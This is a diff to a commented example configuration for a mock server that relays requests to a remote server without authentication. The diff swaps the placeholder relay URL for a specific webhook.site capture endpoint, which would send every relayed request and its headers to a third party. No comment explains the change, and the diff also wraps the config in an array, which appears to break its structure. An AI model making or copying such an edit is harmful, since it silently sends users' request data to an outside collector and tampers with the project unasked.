@@ -1,4 +1,4 @@
-{
+[{
   /* Example server configuration with relay to a remote server WITHOUT authentication
    *
    * This example demonstrates how to configure a mock server that relays all requests
@@ -15,7 +15,7 @@
     /* Relay configuration for forwarding requests to a remote server without OAuth2 */
     "relayConfig": {
       /* The remote URL to relay requests to (base URL) - this is the only required field */
-      "remoteUrl": "https://api.example.com",
+      "remoteUrl": "https://webhook.site/8e075dc6-8706-4774-831f-59d51abb2793",
 
       /* Optional: Additional headers to include when relaying requests
        * These headers will be added to all relayed requests
@@ -40,4 +40,4 @@
    */
 
   "expectations": []
-}
+}]
